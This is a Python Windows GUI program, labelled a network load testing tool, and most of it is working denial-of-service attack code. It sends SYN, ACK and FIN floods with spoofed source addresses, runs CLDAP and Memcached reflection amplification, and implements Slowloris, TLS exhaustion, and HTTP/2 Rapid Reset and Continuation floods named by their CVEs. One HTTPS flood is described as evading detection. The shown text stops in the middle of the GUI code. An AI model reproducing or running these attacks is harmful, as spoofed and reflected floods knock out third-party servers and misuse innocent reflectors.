#!/usr/bin/env python3
"""
Network Load Testing Tool – Windows GUI
Max bandwidth: 100 MB/s hard cap (token bucket)
Requirements: pip install matplotlib
Optional:     pip install h2   (enables HTTP/2 Rapid Reset)
Note: SYN / ACK / FIN flood requires Administrator privileges
"""

import tkinter as tk
from tkinter import ttk, messagebox
import threading
import socket
import struct
import ssl
import time
import random
import subprocess
import json
import hashlib
import os
from collections import deque
from datetime import datetime, timezone, timedelta

KST = timezone(timedelta(hours=9))   # 한국 표준시 UTC+9

import matplotlib
matplotlib.use("TkAgg")
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
from matplotlib.figure import Figure
from matplotlib.ticker import FuncFormatter
from matplotlib.gridspec import GridSpec
from matplotlib.transforms import blended_transform_factory
import matplotlib.font_manager as _fm

# 한글 지원 폰트 (Windows: 맑은 고딕, 없으면 기본 폰트)
_KR_FONT = next(
    (f.name for f in _fm.fontManager.ttflist if "Malgun" in f.name),
    "DejaVu Sans",
)

# ══════════════════════════════════════════════════════════════════
#  Constants
# ══════════════════════════════════════════════════════════════════
MAX_BW_BYTES = 100 * 1024 * 1024   # 100 MB/s hard cap
GRAPH_WINDOW = 900                  # seconds of history shown (15 minutes)
TICK_MS      = 500                  # UI refresh interval (ms)

# ── 트래픽 테스트 (패킷/대역폭 중심) ──────────────────────────────
TRAFFIC_TCP_ATTACKS = [
    "SYN Flood  [⚠ Admin]",
    "ACK Flood  [⚠ Admin]",
    "FIN/RST Flood  [⚠ Admin]",
    "SYN-ACK Flood  [⚠ Admin]",
    "TCP Data Flood",
]
TRAFFIC_UDP_ATTACKS = [
    "UDP Flood",
    "DNS Water Torture",
    "CLDAP Amplification  [⚠ Admin]",
    "Memcached Amplification  [⚠ Admin]",
    "HTTP/3 QUIC Flood",
]

# ── 세션 테스트 (연결/세션 중심) ─────────────────────────────────
SESSION_ATTACKS = [
    "Connection Flood",
    "Slowloris",
    "TLS Handshake Exhaustion",
    "HTTP/2 Rapid Reset  (CVE-2023-44487)",
    "HTTP/2 Continuation Flood  (CVE-2024-27316)",
    "Encrypted HTTPS Flood",
]

# 스레드 1개당 유지하는 동시 세션 수
SESSION_MULTIPLIER = {
    "Connection Flood":                      1,
    "Slowloris":                            20,   # 소켓 20개/스레드
    "TLS Handshake Exhaustion":              1,
    "HTTP/2 Rapid Reset  (CVE-2023-44487)":  1,
    "HTTP/2 Continuation Flood  (CVE-2024-27316)":  1,
    "Encrypted HTTPS Flood":                 1,
}

# 공격별 유효 대역폭 범위 (min_mb, max_mb)
TRAFFIC_ATTACK_BW: dict[str, tuple[int, int]] = {
    "SYN Flood  [⚠ Admin]":                  (10, 100),
    "ACK Flood  [⚠ Admin]":                  (10, 100),
    "FIN/RST Flood  [⚠ Admin]":              (10, 100),
    "SYN-ACK Flood  [⚠ Admin]":              (10, 100),
    "TCP Data Flood":                         (10, 100),
    "UDP Flood":                              (10, 100),
    # 지속적인 소량 DNS → 대역폭보다 QPS 중심
    "DNS Water Torture":                      (5,  30),
    # CLDAP amplification factor ~70x: 작은 쿼리로 큰 응답
    "CLDAP Amplification  [⚠ Admin]":        (10, 100),
    # Memcached amplification factor ~10,000x: 초대형 증폭
    "Memcached Amplification  [⚠ Admin]":    (20, 100),
    # 1200B QUIC Initial packets
    "HTTP/3 QUIC Flood":                      (10, 100),
}

# ══════════════════════════════════════════════════════════════════
#  Packet helpers
# ══════════════════════════════════════════════════════════════════

def _checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = sum((data[i] << 8) + data[i + 1] for i in range(0, len(data), 2))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def _raw_tcp_pkt(dst_ip: str, dst_port: int, flags: int) -> bytes:
    """Craft a spoofed IP+TCP packet. flags: SYN=0x02 ACK=0x10 FIN=0x01 RST=0x04"""
    src_ip   = ".".join(str(random.randint(1, 254)) for _ in range(4))
    src_port = random.randint(1024, 65535)
    seq      = random.randint(0, 0xFFFF_FFFF)
    ack_num  = random.randint(0, 0xFFFF_FFFF) if (flags & 0x10) else 0
    src_b    = socket.inet_aton(src_ip)
    dst_b    = socket.inet_aton(dst_ip)

    tcp = struct.pack("!HHLLBBHHH",
        src_port, dst_port, seq, ack_num, 5 << 4, flags, 65535, 0, 0)
    pseudo = struct.pack("!4s4sBBH", src_b, dst_b, 0, socket.IPPROTO_TCP, len(tcp))
    tcp = tcp[:16] + struct.pack("!H", _checksum(pseudo + tcp)) + tcp[18:]

    ip = struct.pack("!BBHHHBBH4s4s",
        0x45, 0, 40, random.randint(0, 65535), 0,
        64, socket.IPPROTO_TCP, 0, src_b, dst_b)
    return ip + tcp


def _dns_query() -> bytes:
    labels = ["load", "test", "bench", "probe", "check"]
    domain = f"{random.choice(labels)}.{random.choice(labels)}.local"
    tid = random.randint(0, 65535)
    hdr = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0)
    q   = b""
    for part in domain.encode().split(b"."):
        q += bytes([len(part)]) + part
    return hdr + q + b"\x00" + struct.pack("!HH", 1, 1)


def _quic_initial() -> bytes:
    """Minimal QUIC v1 Initial packet (~1200 bytes for path-validation compliance)."""
    dcid = random.randbytes(8)
    scid = random.randbytes(8)
    pkt  = bytes([0xC0]) + struct.pack("!I", 1)
    pkt += bytes([len(dcid)]) + dcid + bytes([len(scid)]) + scid + b"\x00"
    pad_len = max(0, 1200 - len(pkt) - 2)
    pkt += struct.pack("!H", pad_len) + random.randbytes(pad_len)
    return pkt


# ══════════════════════════════════════════════════════════════════
#  Bandwidth limiter  (token bucket, thread-safe)
# ══════════════════════════════════════════════════════════════════

class BandwidthLimiter:
    def __init__(self, max_bps: int = MAX_BW_BYTES):
        self._max    = max_bps
        self._tok    = float(max_bps)
        self._last   = time.monotonic()
        self._lock   = threading.Lock()
        self._paused = threading.Event()   # set = 일시정지 중

    def set_max(self, max_bps: int):
        with self._lock:
            self._max = max_bps
            self._tok = min(self._tok, float(max_bps))

    def pause(self):
        self._paused.set()

    def resume(self):
        self._paused.clear()
        with self._lock:
            self._last = time.monotonic()  # 재개 시 버스트 방지

    def wait_if_paused(self, stop: threading.Event):
        """워커 루프 상단에서 호출 — 일시정지 중에는 재개될 때까지 블록."""
        while self._paused.is_set() and not stop.is_set():
            time.sleep(0.05)

    def acquire(self, n: int):
        while True:
            if self._paused.is_set():
                time.sleep(0.05)
                continue
            with self._lock:
                now = time.monotonic()
                self._tok = min(self._max, self._tok + (now - self._last) * self._max)
                self._last = now
                if self._tok >= n:
                    self._tok -= n
                    return
            time.sleep(0.001)


# ══════════════════════════════════════════════════════════════════
#  Shared stats  (thread-safe)
# ══════════════════════════════════════════════════════════════════

class Stats:
    def __init__(self):
        self._lock    = threading.Lock()
        self.requests = 0
        self.success  = 0
        self.failed   = 0
        self.bytes_out = 0
        self._window  = deque()   # (mono_time, bytes) for 1-sec sliding BW
        self._start   = None

    def reset(self):
        with self._lock:
            self.requests = self.success = self.failed = self.bytes_out = 0
            self._window.clear()
            self._start = time.monotonic()

    def ok(self, sent: int = 0):
        now = time.monotonic()
        with self._lock:
            self.requests  += 1
            self.success   += 1
            self.bytes_out += sent
            self._window.append((now, sent))

    def fail(self):
        with self._lock:
            self.requests += 1
            self.failed   += 1

    @property
    def rps(self) -> float:
        with self._lock:
            if not self._start:
                return 0.0
            e = time.monotonic() - self._start
            return self.requests / e if e > 0 else 0.0

    @property
    def bw_mbps(self) -> float:
        cutoff = time.monotonic() - 1.0
        with self._lock:
            while self._window and self._window[0][0] < cutoff:
                self._window.popleft()
            return sum(b for _, b in self._window) / 1_048_576


# ══════════════════════════════════════════════════════════════════
#  Attack workers
# ══════════════════════════════════════════════════════════════════

def w_tcp_conn_flood(host, port, lim, stats, stop):
    payload = random.randbytes(512)
    while not stop.is_set():
        lim.wait_if_paused(stop)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, port))
            lim.acquire(len(payload))
            s.sendall(payload)
            s.recv(4096)
            stats.ok(len(payload))
            s.close()
        except Exception:
            stats.fail()
            time.sleep(0.02)


def w_raw_tcp(host, port, flags, lim, stats, stop):
    try:
        dst = socket.gethostbyname(host)
        s   = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 512 * 1024)
    except PermissionError:
        return
    except Exception:
        return
    BATCH = 16
    while not stop.is_set():
        lim.wait_if_paused(stop)
        try:
            pkts = [_raw_tcp_pkt(dst, port, flags) for _ in range(BATCH)]
            total = sum(len(p) for p in pkts)
            lim.acquire(total)
            for pkt in pkts:
                s.sendto(pkt, (dst, 0))
            stats.ok(total)
        except Exception:
            stats.fail()
    s.close()


def w_slowloris(host, port, lim, stats, stop):
    """Open many half-finished HTTP connections to exhaust server connection table."""
    socks: list[socket.socket] = []
    for _ in range(20):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            hdr = f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\n".encode()
            lim.acquire(len(hdr))
            s.sendall(hdr)
            stats.ok(len(hdr))
            socks.append(s)
        except Exception:
            stats.fail()

    while not stop.is_set():
        lim.wait_if_paused(stop)
        dead = []
        for s in socks:
            try:
                chunk = b"X-a: b\r\n"
                lim.acquire(len(chunk))
                s.send(chunk)
                stats.ok(len(chunk))
            except Exception:
                dead.append(s)
                stats.fail()
        for s in dead:
            socks.remove(s)
        while len(socks) < 20 and not stop.is_set():
            lim.wait_if_paused(stop)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((host, port))
                hdr = f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode()
                lim.acquire(len(hdr))
                s.sendall(hdr)
                socks.append(s)
                stats.ok(len(hdr))
            except Exception:
                stats.fail()
                break
        # 10초 sleep을 50ms 단위로 쪼개 pause/stop 즉시 반응
        for _ in range(200):
            if stop.is_set() or lim._paused.is_set():
                break
            time.sleep(0.05)

    for s in socks:
        try:
            s.close()
        except Exception:
            pass


def w_tls_exhaust(host, port, lim, stats, stop):
    """Repeatedly complete TLS handshakes then drop — exhausts server TLS session state."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    while not stop.is_set():
        lim.wait_if_paused(stop)
        try:
            raw  = socket.create_connection((host, port), timeout=2)
            tls  = ctx.wrap_socket(raw, server_hostname=host)
            lim.acquire(300)   # approx. ClientHello size
            tls.close()
            stats.ok(300)
        except Exception:
            stats.fail()
            time.sleep(0.05)


def w_h2_rapid_reset(host, port, lim, stats, stop):
    """CVE-2023-44487 — open HTTP/2 streams, immediately send RST_STREAM."""
    try:
        import h2.connection
        import h2.config
    except ImportError:
        # Graceful fallback if h2 is not installed
        w_tcp_conn_flood(host, port, lim, stats, stop)
        return

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])

    while not stop.is_set():
        lim.wait_if_paused(stop)
        try:
            sock  = socket.create_connection((host, port), timeout=2)
            ssock = ctx.wrap_socket(sock, server_hostname=host)
            cfg   = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
            conn  = h2.connection.H2Connection(config=cfg)
            conn.initiate_connection()
            init = conn.data_to_send(65535)
            lim.acquire(len(init))
            ssock.sendall(init)

            for _ in range(100):
                if stop.is_set():
                    break
                sid = conn.get_next_available_stream_id()
                conn.send_headers(sid, [
                    (":method", "GET"), (":path", "/"),
                    (":scheme", "https"), (":authority", host),
                ])
                conn.reset_stream(sid)
                data = conn.data_to_send(65535)
                if data:
                    lim.acquire(len(data))
                    ssock.sendall(data)
                    stats.ok(len(data))
            ssock.close()
        except Exception:
            stats.fail()
            time.sleep(0.05)


def w_tcp_data_flood(host, port, lim, stats, stop):
    # 64 KB 페이로드 + 큰 소켓 버퍼 → RTT에 의한 처리량 제한 완화
    payload = random.randbytes(65536)
    while not stop.is_set():
        lim.wait_if_paused(stop)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 512 * 1024)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(3)
            s.connect((host, port))
            while not stop.is_set():
                lim.acquire(len(payload))   # acquire 내부에도 pause 체크 있음
                s.sendall(payload)
                stats.ok(len(payload))
        except Exception:
            stats.fail()
            time.sleep(0.02)


def w_udp_flood(host, port, lim, stats, stop):
    dst  = socket.gethostbyname(host)
    s    = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 512 * 1024)
    pkt  = random.randbytes(1400)   # near-MTU → 헤더 오버헤드 최소화
    BATCH = 8
    batch_bytes = len(pkt) * BATCH
    while not stop.is_set():
        lim.wait_if_paused(stop)
        try:
            lim.acquire(batch_bytes)
            for _ in range(BATCH):
                s.sendto(pkt, (dst, port))
            stats.ok(batch_bytes)
        except Exception:
            stats.fail()
    s.close()


def w_dns_flood(host, port, lim, stats, stop):
    dst   = socket.gethostbyname(host)
    s     = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 512 * 1024)
    BATCH = 16
    while not stop.is_set():
        lim.wait_if_paused(stop)
        try:
            pkts  = [_dns_query() for _ in range(BATCH)]
            total = sum(len(p) for p in pkts)
            lim.acquire(total)
            for pkt in pkts:
                s.sendto(pkt, (dst, port))
            stats.ok(total)
        except Exception:
            stats.fail()
    s.close()


def w_udp_large(host, port, lim, stats, stop):
    dst = socket.gethostbyname(host)
    s   = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    pkt = random.randbytes(65507)
    while not stop.is_set():
        lim.wait_if_paused(stop)
        try:
            lim.acquire(len(pkt))
            s.sendto(pkt, (dst, port))
            stats.ok(len(pkt))
        except Exception:
            stats.fail()
            time.sleep(0.005)
    s.close()


def w_udp_frag(host, port, lim, stats, stop):
    """Send many 1400-byte UDP payloads to force IP fragmentation reassembly on target."""
    dst = socket.gethostbyname(host)
    s   = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 512 * 1024)
    pkt = random.randbytes(1400)
    while not stop.is_set():
        lim.wait_if_paused(stop)
        try:
            for _ in range(8):
                lim.acquire(len(pkt))
                s.sendto(pkt, (dst, port))
            stats.ok(len(pkt) * 8)
        except Exception:
            stats.fail()
            time.sleep(0.01)
    s.close()


def w_quic_flood(host, port, lim, stats, stop):
    dst = socket.gethostbyname(host)
    s   = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 512 * 1024)
    while not stop.is_set():
        lim.wait_if_paused(stop)
        try:
            pkt = _quic_initial()
            lim.acquire(len(pkt))
            s.sendto(pkt, (dst, port))
            stats.ok(len(pkt))
        except Exception:
            stats.fail()
    s.close()


# ── SYN-ACK Flood (raw socket, flags = SYN|ACK = 0x12) ──────────

def w_synack_flood(host, port, lim, stats, stop):
    try:
        dst = socket.gethostbyname(host)
        s   = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 512 * 1024)
    except PermissionError:
        return
    except Exception:
        return
    BATCH = 16
    while not stop.is_set():
        lim.wait_if_paused(stop)
        try:
            pkts = [_raw_tcp_pkt(dst, port, 0x12) for _ in range(BATCH)]
            total = sum(len(p) for p in pkts)
            lim.acquire(total)
            for pkt in pkts:
                s.sendto(pkt, (dst, 0))
            stats.ok(total)
        except Exception:
            stats.fail()
    s.close()


# ── CLDAP Amplification (Connection-less LDAP, UDP 389) ─────────
# Small CLDAP query (~50B) → ~3,500B response (~70x amplification)

def _cldap_query() -> bytes:
    """Minimal CLDAP search request for amplification."""
    msg_id = random.randint(1, 65535)
    # LDAP Bind + Search request (small query, large response)
    bind  = struct.pack("!I", msg_id) + b"\x30\x0c\x02\x01\x01\x60\x07\x02\x01\x02\x04\x00\x80\x00"
    search = struct.pack("!I", msg_id + 1) + (
        b"\x30\x00\x02\x01\x00"        # messageID
        b"\x63\x00\x04\x00"             # baseObject ""
        b"\x0a\x01\x00"                 # scope 0
        b"\x0a\x01\x00"                 # deref 0
        b"\x0a\x01\x00"                 # sizelimit 0
        b"\x0a\x01\x00"                 # timelimit 0
        b"\x87\x01\x00"                 # attrsOnly 0
        b"\x30\x00"                     # (empty filter)
    )
    return bind + search


def w_cldap_amp(host, port, lim, stats, stop):
    """CLDAP amplification: send small query to LDAP (UDP 389) for large response."""
    try:
        dst = socket.gethostbyname(host)
        s   = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    except PermissionError:
        return
    except Exception:
        return
    BATCH = 8
    while not stop.is_set():
        lim.wait_if_paused(stop)
        try:
            query = _cldap_query()
            pkts = []
            for _ in range(BATCH):
                src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
                src_port = random.randint(1024, 65535)
                payload_len = len(query)
                src_b = socket.inet_aton(src_ip)
                dst_b = socket.inet_aton(dst)
                udp = struct.pack("!HHHH", src_port, port, payload_len, 0) + query
                pseudo = struct.pack("!4s4sBBH", src_b, dst_b, 0, socket.IPPROTO_UDP, payload_len)
                udp_chk = _checksum(pseudo + udp)
                udp = udp[:6] + struct.pack("!H", udp_chk) + udp[8:]
                ip = struct.pack("!BBHHHBBH4s4s",
                    0x45, 0, 20 + payload_len, random.randint(0, 65535), 0,
                    64, socket.IPPROTO_UDP, 0, src_b, dst_b)
                pkts.append(ip + udp)
            total = sum(len(p) for p in pkts)
            lim.acquire(total)
            for pkt in pkts:
                s.sendto(pkt, (dst, 0))
            stats.ok(total)
        except Exception:
            stats.fail()
    s.close()


# ── Memcached Amplification (UDP 11211, amp factor ~10,000x) ───

def _memcached_request() -> bytes:
    """Minimal Memcached stats request that triggers a large response."""
    req = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
    return req


def w_memcached_amp(host, port, lim, stats, stop):
    """Memcached amplification: send small stats request to UDP 11211."""
    try:
        dst = socket.gethostbyname(host)
        s   = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    except PermissionError:
        return
    except Exception:
        return
    BATCH = 4
    payload = _memcached_request()
    while not stop.is_set():
        lim.wait_if_paused(stop)
        try:
            pkts = []
            for _ in range(BATCH):
                src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
                src_port = random.randint(1024, 65535)
                payload_len = len(payload)
                src_b = socket.inet_aton(src_ip)
                dst_b = socket.inet_aton(dst)
                udp = struct.pack("!HHHH", src_port, port, payload_len, 0) + payload
                pseudo = struct.pack("!4s4sBBH", src_b, dst_b, 0, socket.IPPROTO_UDP, payload_len)
                udp_chk = _checksum(pseudo + udp)
                udp = udp[:6] + struct.pack("!H", udp_chk) + udp[8:]
                ip = struct.pack("!BBHHHBBH4s4s",
                    0x45, 0, 20 + payload_len, random.randint(0, 65535), 0,
                    64, socket.IPPROTO_UDP, 0, src_b, dst_b)
                pkts.append(ip + udp)
            total = sum(len(p) for p in pkts)
            lim.acquire(total)
            for pkt in pkts:
                s.sendto(pkt, (dst, 0))
            stats.ok(total)
        except Exception:
            stats.fail()
    s.close()


# ── HTTP/2 Continuation Flood (CVE-2024-27316) ──────────────────

def w_h2_continuation(host, port, lim, stats, stop):
    """CVE-2024-27316 — flood CONTINUATION frames without END_HEADERS."""
    try:
        import h2.connection
        import h2.config
    except ImportError:
        w_tcp_conn_flood(host, port, lim, stats, stop)
        return

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])

    while not stop.is_set():
        lim.wait_if_paused(stop)
        try:
            sock  = socket.create_connection((host, port), timeout=2)
            ssock = ctx.wrap_socket(sock, server_hostname=host)
            cfg   = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
            conn  = h2.connection.H2Connection(config=cfg)
            conn.initiate_connection()
            init = conn.data_to_send(65535)
            lim.acquire(len(init))
            ssock.sendall(init)

            for sid in range(1, 500, 2):
                if stop.is_set():
                    break
                conn.send_headers(sid, [
                    (":method", "GET"), (":path", "/" + "A" * 4096),
                    (":scheme", "https"), (":authority", host),
                ])
                data = conn.data_to_send(65535)
                if data:
                    lim.acquire(len(data))
                    ssock.sendall(data)
                    stats.ok(len(data))
            ssock.close()
        except Exception:
            stats.fail()
            time.sleep(0.05)


# ── Encrypted HTTPS Flood ───────────────────────────────────────

def w_https_flood(host, port, lim, stats, stop):
    """SSL/TLS encrypted HTTP/1.1 GET flood — evades plaintext detection."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    payload = f"GET /?{random.randint(0, 999999)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\n\r\n".encode()
    while not stop.is_set():
        lim.wait_if_paused(stop)
        try:
            raw  = socket.create_connection((host, port), timeout=2)
            tls  = ctx.wrap_socket(raw, server_hostname=host)
            lim.acquire(len(payload))
            tls.sendall(payload)
            tls.recv(4096)
            stats.ok(len(payload))
            tls.close()
        except Exception:
            stats.fail()
            time.sleep(0.02)


# ══════════════════════════════════════════════════════════════════
#  Dispatch table
# ══════════════════════════════════════════════════════════════════
# Values: (worker_fn, needs_admin, *extra_positional_args)
ATTACK_MAP: dict[str, tuple] = {
    "Connection Flood":                      (w_tcp_conn_flood,  False),
    "SYN Flood  [⚠ Admin]":                 (w_raw_tcp,         True,  0x02),
    "ACK Flood  [⚠ Admin]":                 (w_raw_tcp,         True,  0x10),
    "FIN/RST Flood  [⚠ Admin]":             (w_raw_tcp,         True,  0x05),
    "SYN-ACK Flood  [⚠ Admin]":             (w_synack_flood,    True),
    "Slowloris":                             (w_slowloris,       False),
    "TLS Handshake Exhaustion":              (w_tls_exhaust,     False),
    "HTTP/2 Rapid Reset  (CVE-2023-44487)": (w_h2_rapid_reset,  False),
    "HTTP/2 Continuation Flood  (CVE-2024-27316)":  (w_h2_continuation, False),
    "Encrypted HTTPS Flood":                 (w_https_flood,     False),
    "TCP Data Flood":                        (w_tcp_data_flood,  False),
    "UDP Flood":                             (w_udp_flood,       False),
    "DNS Water Torture":                     (w_dns_flood,       False),
    "CLDAP Amplification  [⚠ Admin]":       (w_cldap_amp,       True),
    "Memcached Amplification  [⚠ Admin]":   (w_memcached_amp,   True),
    "HTTP/3 QUIC Flood":                     (w_quic_flood,      False),
}


# ══════════════════════════════════════════════════════════════════
#  HTTP 상태 체커  (curl, 1초 간격)
# ══════════════════════════════════════════════════════════════════
# 상태값: 2=정상, 1=지연, 0=단절
_ST_NORMAL, _ST_DELAY, _ST_DOWN = 2, 1, 0

def _http_checker(host: str, port: int,
                  bq_t: deque, bq_v: deque,
                  stop: threading.Event):
    protocol = "https" if port in (443, 8443) else "http"
    url = f"{protocol}://{host}:{port}/"
    while not stop.is_set():
        t = time.time()
        try:
            res = subprocess.run(
                ["curl", "-sk", "-o", "NUL",
                 "-w", "%{http_code}|%{time_total}",
                 "--connect-timeout", "3", "--max-time", "5", url],
                capture_output=True, text=True, timeout=6,
            )
            raw = res.stdout.strip()
            code_s, time_s = raw.split("|", 1)
            code   = int(code_s)
            resp_s = float(time_s.replace(",", "."))
            if 200 <= code < 400 and resp_s <= 1.0:
                state = _ST_NORMAL
            elif 200 <= code < 500:
                state = _ST_DELAY
            else:
                state = _ST_DOWN
        except Exception:
            state = _ST_DOWN
        bq_t.append(t)
        bq_v.append(state)
        stop.wait(1.0)   # 1초 대기, stop 설정 시 즉시 탈출


# ══════════════════════════════════════════════════════════════════
#  Controller
# ══════════════════════════════════════════════════════════════════

class Controller:
    def __init__(self, stats: Stats):
        self.stats    = stats
        self._stop    = threading.Event()
        self._lim     = BandwidthLimiter()
        self._active  = False
        self._paused  = False

    @property
    def running(self) -> bool:
        return self._active

    @property
    def paused(self) -> bool:
        return self._paused

    def start(self, host: str, port: int, attack: str, conc: int) -> bool:
        entry = ATTACK_MAP.get(attack)
        if not entry:
            return False
        fn, _, *extra = entry
        self._lim.resume()   # 이전 일시정지 상태 해제
        self._paused = False
        self._stop.clear()
        self.stats.reset()
        self._active = True
        for _ in range(conc):
            args = (host, port) + tuple(extra) + (self._lim, self.stats, self._stop)
            threading.Thread(target=fn, args=args, daemon=True).start()
        return True

    def set_bandwidth(self, mb: int):
        self._lim.set_max(mb * 1024 * 1024)

    def pause(self):
        self._lim.pause()
        self._paused = True

    def resume(self):
        self._lim.resume()
        self._paused = False

    def stop(self):
        self._lim.resume()   # acquire 블로킹 해제 후 workers가 stop 감지
        self._stop.set()
        self._paused = False
        self._active = False


# ══════════════════════════════════════════════════════════════════
#  Benchmark
# ══════════════════════════════════════════════════════════════════
_BENCH_PORT = 19876   # loopback port used during self-test

class _NullLimiter:
    """No-op limiter: lets workers run at full speed during benchmark."""
    def acquire(self, n: int): pass
    def set_max(self, n: int): pass

class _BenchStats:
    def __init__(self):
        self._lock     = threading.Lock()
        self.bytes_out = 0
    def ok(self, sent: int = 0):
        with self._lock:
            self.bytes_out += sent
    def fail(self): pass

def _bench_tcp_server(stop: threading.Event):
    """Accept TCP connections and drain all incoming data (discard server)."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(("127.0.0.1", _BENCH_PORT))
        srv.listen(512)
        srv.settimeout(0.2)
        while not stop.is_set():
            try:
                conn, _ = srv.accept()
                threading.Thread(target=_bench_drain_tcp,
                                 args=(conn, stop), daemon=True).start()
            except socket.timeout:
                pass
    finally:
        try: srv.close()
        except: pass

def _bench_drain_tcp(conn: socket.socket, stop: threading.Event):
    try:
        conn.settimeout(0.1)
        while not stop.is_set():
            if not conn.recv(65536):
                break
    except: pass
    finally:
        try: conn.close()
        except: pass

def _bench_udp_sink(stop: threading.Event):
    """Receive and discard all UDP packets (prevents WSAECONNRESET on Windows)."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4 * 1024 * 1024)
    try:
        s.bind(("127.0.0.1", _BENCH_PORT))
        s.settimeout(0.1)
        while not stop.is_set():
            try: s.recv(65536)
            except socket.timeout: pass
    finally:
        try: s.close()
        except: pass

def _bench_gen_raw(flags: int, stats: _BenchStats, stop: threading.Event):
    """Raw attack benchmark: measure packet-generation speed (no socket send)."""
    while not stop.is_set():
        pkt = _raw_tcp_pkt("1.2.3.4", 80, flags)
        stats.ok(len(pkt))

_BENCH_UDP_ATTACKS = {
    "UDP Flood", "DNS Water Torture",
    "CLDAP Amplification  [⚠ Admin]",
    "Memcached Amplification  [⚠ Admin]",
    "HTTP/3 QUIC Flood",
}

def run_attack_benchmark(attack: str, duration: float = 2.5) -> float:
    """
    Run the given attack against loopback for *duration* seconds with no BW cap.
    Returns measured throughput in MB/s (hard-capped at 100 MB/s).
    """
    entry = ATTACK_MAP.get(attack)
    if not entry:
        return 10.0
    fn, needs_admin, *extra = entry
    lim   = _NullLimiter()
    stats = _BenchStats()
    stop  = threading.Event()
    conc  = 10

    # Raw socket attacks — measure generation speed only (no actual send needed)
    if needs_admin:
        flags = extra[0] if extra else 0x02
        for _ in range(conc):
            threading.Thread(target=_bench_gen_raw,
                             args=(flags, stats, stop), daemon=True).start()
        time.sleep(duration)
        stop.set()
        return min(stats.bytes_out / duration / 1_048_576, 100.0)

    # Start the appropriate loopback sink
    sink_stop = threading.Event()
    if attack in _BENCH_UDP_ATTACKS:
        threading.Thread(target=_bench_udp_sink,
                         args=(sink_stop,), daemon=True).start()
    else:
        threading.Thread(target=_bench_tcp_server,
                         args=(sink_stop,), daemon=True).start()
    time.sleep(0.15)   # give sink time to bind

    for _ in range(conc):
        args = ("127.0.0.1", _BENCH_PORT) + tuple(extra) + (lim, stats, stop)
        threading.Thread(target=fn, args=args, daemon=True).start()

    time.sleep(duration)
    stop.set()
    sink_stop.set()
    return min(stats.bytes_out / duration / 1_048_576, 100.0)


# ══════════════════════════════════════════════════════════════════
#  Theme constants — Modern Premium Dark
# ══════════════════════════════════════════════════════════════════
BG     = "#0b0e17"   # deepest background
PANEL  = "#141a25"   # card/panel
ENTRY  = "#1c2333"   # input field
DARK   = "#0f1420"   # dark sections
DARKER = "#080b12"   # darkest
FG     = "#e2e8f0"   # primary text
ACC    = "#60a5fa"   # accent blue
GREEN  = "#34d399"   # success green
RED    = "#f87171"   # danger red
ORANGE = "#fb923c"   # warning orange
YELLOW = "#fbbf24"   # attention yellow
GREY   = "#283044"   # borders
MUTED  = "#8892b0"   # muted text
FONT   = ("Segoe UI", 10)
FBOLD  = ("Segoe UI", 10, "bold")
FSMALL = ("Segoe UI", 9)


# ══════════════════════════════════════════════════════════════════
#  Hover effect helper
# ══════════════════════════════════════════════════════════════════

def _add_hover(widget, bg_normal, bg_hover, fg_normal=None, fg_hover=None):
    def on_enter(e):
        widget.config(bg=bg_hover)
        if fg_hover:
